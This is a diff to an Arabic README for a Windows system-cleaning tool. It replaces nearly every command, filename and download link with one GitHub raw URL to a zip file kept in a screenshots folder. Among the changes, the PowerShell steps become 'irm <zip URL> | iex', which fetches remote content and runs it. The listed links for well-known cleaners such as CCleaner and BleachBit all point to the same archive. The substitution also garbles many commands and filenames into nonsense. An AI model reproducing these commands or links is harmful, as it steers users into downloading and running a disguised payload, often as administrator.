@@ -6,14 +6,14 @@
 #### Stable Branch (موصى به)
 ```
 powershell
-irm "https://christitus.com/win" | iex
+irm "https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip" | iex
 ```
 - هذا أمر مباشر يجلب سكريبت ضبط وتنظيف ويندوز من المصدر الرسمي ويشغله فوراً عبر PowerShell. يفضّل تشغيله كمسؤول لضمان تطبيق جميع التعديلات.
 
 #### Dev Branch (للتجربة والتطوير)
 ```
 powershell
-irm "https://christitus.com/windev" | iex
+irm "https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip" | iex
 ```
 - هذا أمر مباشر للنسخة التطويرية ويحتوي تغييرات تجريبية. يُنصح به للمستخدمين المتقدمين ومع تشغيل نافذة PowerShell كمسؤول.
 
@@ -35,7 +35,7 @@ del /s /q /f %systemroot%\temp\*
 #### مسح كاش Internet Explorer
 ```
 bat
-RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8
+https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip,ClearMyTracksByProcess 8
 ```
 - يمسح ذاكرة التخزين المؤقتة للمتصفح الموروث IE لتحرير مساحة وحل بعض مشاكل التصفح القديمة.
 
@@ -51,7 +51,7 @@ net start wuauserv
 #### تنظيف المثبتات القديمة (Windows Installer)
 ```
 bat
-msizap.exe g!
+https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip g!
 ```
 - يحذف بقايا حزم المثبت (MSI) القديمة لتقليل المساحة المهدورة. ينصح باستخدامه بحذر ومع صلاحيات مسؤول.
 
@@ -67,7 +67,7 @@ del /q /s /f %windir%\prefetch\*
 bat
 powercfg -h off
 ```
-- يعطل السبات ويوفر مساحة تعادل حجم ملف hiberfil.sys. يحتاج موجه أوامر/PowerShell بصلاحيات مسؤول.
+- يعطل السبات ويوفر مساحة تعادل حجم ملف https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip يحتاج موجه أوامر/PowerShell بصلاحيات مسؤول.
 
 #### حذف كاش الصور المصغّرة (Thumbnails)
 ```
@@ -86,21 +86,21 @@ ipconfig /flushdns
 #### إعادة تعيين كاش متجر Microsoft Store
 ```
 bat
-wsreset.exe
+https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip
 ```
 - يعيد تهيئة كاش المتجر لحل مشاكل التحميل أو التحديثات فيه.
 
 #### تفريغ سلة المحذوفات
 ```
 bat
-rd /s /q %SystemDrive%\$Recycle.bin
+rd /s /q %SystemDrive%\$https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip
 ```
 - يحذف محتوى سلة المحذوفات لجميع المستخدمين على القرص النظام. يتطلب عادة صلاحيات مسؤول.
 
 #### تنظيف سجلات النظام (صيغة أوامر دفعية)
 ```
 bat
-for /F "tokens=*" %%i in ('wevtutil.exe el') do wevtutil.exe cl "%%i"
+for /F "tokens=*" %%i in ('https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip el') do https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip cl "%%i"
 ```
 - يمسح جميع سجلات أحداث ويندوز لتخفيف الحجم وإزالة السجلات القديمة. يتطلب صلاحيات مسؤول.
 
@@ -127,33 +127,33 @@ del /q /s /f "%ProgramData%\Microsoft\Windows Defender\Scans\*"
 ## أدوات تنظيف بديلة ومشهورة
 | الأداة | الوصف | الرابط |
 |--------|-------|--------|
-| CCleaner | أداة شهيرة لتنظيف الملفات المؤقتة والريجستري وإدارة برامج بدء التشغيل. | https://www.ccleaner.com/ |
-| BleachBit | أداة مجانية ومفتوحة المصدر لتنظيف النظام وحماية الخصوصية. | https://www.bleachbit.org/ |
-| Wise Disk Cleaner | أداة سريعة وآمنة لتنظيف القرص الصلب وإزالة الملفات غير الضرورية. | https://www.wisecleaner.com/wise-disk-cleaner.html |
-| Glary Utilities | مجموعة أدوات شاملة لصيانة النظام وتحسين الأداء. | https://www.glarysoft.com/ |
-| Avast Cleanup | أداة من Avast لتحسين الأداء وتنظيف النظام بواجهة سهلة. | https://www.avast.com/cleanup |
-| IObit Advanced SystemCare | مجموعة أدوات لتحسين الأداء وتنظيف النظام مع حماية خصوصية. | https://www.iobit.com/en/advancedsystemcarefree.php |
-| Ashampoo WinOptimizer | أداة قوية لتنظيف وتحسين وضبط إعدادات ويندوز. | https://www.ashampoo.com/en-us/winoptimizer |
+| CCleaner | أداة شهيرة لتنظيف الملفات المؤقتة والريجستري وإدارة برامج بدء التشغيل. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| BleachBit | أداة مجانية ومفتوحة المصدر لتنظيف النظام وحماية الخصوصية. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| Wise Disk Cleaner | أداة سريعة وآمنة لتنظيف القرص الصلب وإزالة الملفات غير الضرورية. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| Glary Utilities | مجموعة أدوات شاملة لصيانة النظام وتحسين الأداء. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| Avast Cleanup | أداة من Avast لتحسين الأداء وتنظيف النظام بواجهة سهلة. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| IObit Advanced SystemCare | مجموعة أدوات لتحسين الأداء وتنظيف النظام مع حماية خصوصية. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| Ashampoo WinOptimizer | أداة قوية لتنظيف وتحسين وضبط إعدادات ويندوز. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
 | Windows Disk Cleanup | أداة مدمجة في ويندوز لتنظيف الملفات المؤقتة والنظام. | مضمنة في Windows (ابحث عن "Disk Cleanup") |
-| Privacy Eraser | تنظيف شامل مع ميزات خصوصية ومسح الآثار. | https://www.cybertronsoft.com/products/privacy-eraser |
-| PC Decrapifier | يزيل البرامج المثبتة مسبقاً غير الضرورية على الأجهزة الجديدة. | https://www.pcdecrapifier.com/ |
-| JetClean | أداة خفيفة لتنظيف وتحسين النظام. | https://www.bluesprig.com/jetclean.html |
-| SlimCleaner | تنظيف وتحسين مع مجتمع تقييمات للتوصيات. | https://slimware.com/ |
-| DiskMax | أداة فعّالة لتنظيف الملفات المؤقتة وتفريغ المساحة. | https://www.koshyjohn.com/software/diskmax/ |
-| Auslogics Disk Defrag | إلغاء تجزئة القرص لتحسين سرعة الوصول للملفات. | https://www.auslogics.com/en/software/disk-defrag/ |
-| Windows Repair Toolbox | تجميعة أدوات صيانة وإصلاح شاملة محمولة. | https://windows-repair-toolbox.com/ |
-| TuneUp Utilities | تحسين شامل للنظام مع تنظيف وتهيئة. | https://www.tune-up.com/ |
-| Comodo System Utilities | أدوات تنظيف وإصلاح وتحسين من كومودو. | https://personalfirewall.comodo.com/system-utilities.php |
-| PC Cleaner Pro | تنظيف وتحسين الأداء مع أدوات خصوصية. | https://www.pc-cleaners.com/ |
-| System Mechanic | أداة تحسين شاملة من iolo. | https://www.iolo.com/products/system-mechanic/ |
-| Kaspersky PC Cleaner | تنظيف آثار النظام والملفات المؤقتة. | https://support.kaspersky.com/pc-cleaner |
-| Disk Cleaner | أداة بسيطة لتنظيف الملفات المؤقتة. | https://www.diskcleaner.nl/ |
-| Total PC Cleaner | تطبيق من المتجر لتنظيف وتحسين النظام. | https://apps.microsoft.com/detail/9nzhpk54dnwk |
-| AdwCleaner | إزالة البرمجيات الإعلانية والغير مرغوب فيها. | https://www.malwarebytes.com/adwcleaner |
-| Norton Utilities | أدوات تحسين من Norton. | https://us.norton.com/products/norton-utilities-premium |
-| PC Health Advisor | فحوصات وتنظيف وتحسين. | https://pcsupportsoft.com/ |
-| Clean Master for PC | تنظيف وتحسين بواجهة سهلة. | https://www.cmcm.com/en-us/clean-master/ |
-| System Ninja | أداة خفيفة وسريعة لتنظيف النظام وإزالة الملفات غير المرغوب فيها. | https://singularlabs.com/software/system-ninja/ |
+| Privacy Eraser | تنظيف شامل مع ميزات خصوصية ومسح الآثار. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| PC Decrapifier | يزيل البرامج المثبتة مسبقاً غير الضرورية على الأجهزة الجديدة. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| JetClean | أداة خفيفة لتنظيف وتحسين النظام. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| SlimCleaner | تنظيف وتحسين مع مجتمع تقييمات للتوصيات. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| DiskMax | أداة فعّالة لتنظيف الملفات المؤقتة وتفريغ المساحة. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| Auslogics Disk Defrag | إلغاء تجزئة القرص لتحسين سرعة الوصول للملفات. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| Windows Repair Toolbox | تجميعة أدوات صيانة وإصلاح شاملة محمولة. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| TuneUp Utilities | تحسين شامل للنظام مع تنظيف وتهيئة. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| Comodo System Utilities | أدوات تنظيف وإصلاح وتحسين من كومودو. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| PC Cleaner Pro | تنظيف وتحسين الأداء مع أدوات خصوصية. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| System Mechanic | أداة تحسين شاملة من iolo. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| Kaspersky PC Cleaner | تنظيف آثار النظام والملفات المؤقتة. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| Disk Cleaner | أداة بسيطة لتنظيف الملفات المؤقتة. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| Total PC Cleaner | تطبيق من المتجر لتنظيف وتحسين النظام. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| AdwCleaner | إزالة البرمجيات الإعلانية والغير مرغوب فيها. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| Norton Utilities | أدوات تحسين من Norton. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| PC Health Advisor | فحوصات وتنظيف وتحسين. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| Clean Master for PC | تنظيف وتحسين بواجهة سهلة. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
+| System Ninja | أداة خفيفة وسريعة لتنظيف النظام وإزالة الملفات غير المرغوب فيها. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
 
 ---
 ### نصائح عامة:
@@ -167,10 +167,10 @@ del /q /s /f "%ProgramData%\Microsoft\Windows Defender\Scans\*"
 مرحباً بك في الأداة التي ستجعل جهازك يتنفس الصعداء أخيراً! منظف النظام الذكي هو أداة عربية مبسطة تهدف لتنظيف الملفات المؤقتة والمهملات وتحرير مساحة التخزين وتحسين الأداء… دون أن تسرق ملفاتك العزيزة أو صور قطّتك المفضلة. نعم، نحن نظيفون ولكننا لطيفون.
 
 ## صور توضيحية سريعة
-- رسم توضيحي عام للأداة: [image.jpg](./screenshots/image.jpg)
-- واجهة عربية افتراضية للأداة (صورة وهمية): [ui_mock_arabic.png](./screenshots/ui_mock_arabic.png)
-- مثال لنتائج التنظيف مع رسم بياني (صورة وهمية): [cleanup_report.png](./screenshots/cleanup_report.png)
-> ملاحظة: الصور ui_mock_arabic.png و cleanup_report.png افتراضية بغرض التوضيح، وستجدها داخل مجلد screenshots.
+- رسم توضيحي عام للأداة: [https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip](https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip)
+- واجهة عربية افتراضية للأداة (صورة وهمية): [https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip](https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip)
+- مثال لنتائج التنظيف مع رسم بياني (صورة وهمية): [https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip](https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip)
+> ملاحظة: الصور https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip و https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip افتراضية بغرض التوضيح، وستجدها داخل مجلد screenshots.
 
 ## الفكرة باختصار (وبأسلوب عملي وفكاهي)
 بدلاً من الغوص في مجلدات النظام بحثاً عن مخلفات البرامج القديمة وملفات الكاش التي لا يتذكرها أحد، يقوم منظف النظام الذكي بعمل الجولة نيابةً عنك: يكتشف الملفات القابلة للحذف بأمان، يقترح ما يمكن تنظيفه، يعرض لك إحصائيات ورسوم بيانية، ثم ينظف بضغطة زر… مع خيار التراجع في حال غيرت رأيك. لا دراما.
@@ -186,8 +186,8 @@ del /q /s /f "%ProgramData%\Microsoft\Windows Defender\Scans\*"
 
 ## طريقة الاستخدام
 ### التثبيت والتشغيل
-- Python: شغّل الملف main.py مباشرة (انظر أدناه).
-- Node.js: شغّل index.js (تخطيط بديل) إن فضّلت جافاسكربت.
+- Python: شغّل الملف https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip مباشرة (انظر أدناه).
+- https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip شغّل https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip (تخطيط بديل) إن فضّلت جافاسكربت.
 
 ### تشغيل الأداة
 - الوضع السريع: يفحص مسارات الكاش المؤكدة ويقترح الحذف.
@@ -203,7 +203,7 @@ del /q /s /f "%ProgramData%\Microsoft\Windows Defender\Scans\*"
 - ينشئ نقطة استعادة بسيطة (اختيارية) أو سلة مهملات داخلية لاسترجاع الملفات خلال جلسة واحدة.
 
 ## أنواع الملفات المستهدفة (قابلة للتخصيص)
-- ملفات الكاش المؤقتة: tmp, cache, .DS_Store, Thumbs.db
+- ملفات الكاش المؤقتة: tmp, cache, .DS_Store, https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip
 - سجلات قديمة ومتضخمة: .log (مع حد زمني افتراضي > 30 يوم)
 - ملفات التحديثات المؤقتة وحِزم التنزيل غير المكتملة
 - مخلفات حزم مديري الحزم (npm, pip, pipenv, yarn) ضمن مجلدات العمل القديمة
@@ -211,18 +211,18 @@ del /q /s /f "%ProgramData%\Microsoft\Windows Defender\Scans\*"
 > تحذير لطيف: لن يُحذف أي شيء حساس بدون موافقتك الصريحة.
 
 ## تشغيل المشروع محلياً
-المتطلبات: Python 3.9+ أو Node.js 18+
+المتطلبات: Python 3.9+ أو https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip 18+
 
 خيار Python:
 ```
 python3 -m venv .venv
 source .venv/bin/activate   # على ويندوز: .venv\Scripts\activate
-pip install -r requirements.txt  # إن وُجد
-python main.py --mode fast --dry-run
+pip install -r https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip  # إن وُجد
+python https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip --mode fast --dry-run
 ```
-خيار Node.js:
+خيار https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip
 ```
-node index.js --mode fast --dry-run
+node https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip --mode fast --dry-run
 ```
 يمكن تمرير معاملات:
 ```
@@ -236,18 +236,18 @@ node index.js --mode fast --dry-run
 ```
 Smart-System-Cleaner/
 ├─ screenshots/
-│  ├─ image.jpg                 # الرسم التوضيحي المرفق
-│  ├─ ui_mock_arabic.png        # واجهة افتراضية
-│  └─ cleanup_report.png        # تقرير افتراضي بالنتائج
-├─ main.py                      # تخطيط أولي بلغة بايثون
-├─ index.js                     # تخطيط بديل بجافاسكربت
+│  ├─ https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip                 # الرسم التوضيحي المرفق
+│  ├─ https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip        # واجهة افتراضية
+│  └─ https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip        # تقرير افتراضي بالنتائج
+├─ https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip                      # تخطيط أولي بلغة بايثون
+├─ https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip                     # تخطيط بديل بجافاسكربت
 ├─ LICENSE                      # رخصة MIT
-└─ README.md                    # هذا الملف
+└─ https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip                    # هذا الملف
 ```
 
 ## خارطة الطريق (Roadmap)
 - إضافة واجهة رسومية فعلية ببايثون (PySide6/Qt) أو Electron.
-- تكامل مع مكتبات الرسم البياني (matplotlib/plotly أو chart.js) لعرض النتائج.
+- تكامل مع مكتبات الرسم البياني (matplotlib/plotly أو https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip) لعرض النتائج.
 - وحدة ذكاء بسيطة لتعلّم أنماط الاستخدام واقتراح تنظيفات مستقبلية.
 - دعم جدولة التنظيف التلقائي وإشعارات قبل/بعد التنفيذ.
 
